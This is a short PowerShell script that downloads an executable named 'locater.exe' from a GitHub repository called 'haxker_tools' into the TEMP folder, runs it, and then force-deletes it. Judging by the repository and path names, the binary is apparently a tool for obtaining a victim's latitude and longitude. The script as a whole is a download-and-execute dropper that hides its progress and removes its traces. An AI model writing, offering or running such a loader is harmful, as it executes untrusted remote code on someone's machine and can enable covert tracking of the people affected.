$OutputEncoding = [System.Text.Encoding]::UTF8
$ProgressPreference = "SilentlyContinue"

# Download exe
$exeUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/get_LonLat/GetFile/locater.exe"
$exePath = "$env:TEMP\locater.exe"

Write-Host "Downloading..."

try {
    # 🚀 Faster than Invoke-WebRequest
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    Write-Host "Download Success"
}
catch {
    Write-Host "Download failed:" $_.Exception.Message
    exit 1
}
finally {
    if ($wc) { $wc.Dispose() }
}

# Execute
Start-Process $exePath -Wait

Write-Host "Run Success"

# Cleanup
Remove-Item $exePath -Force -ErrorAction SilentlyContinue
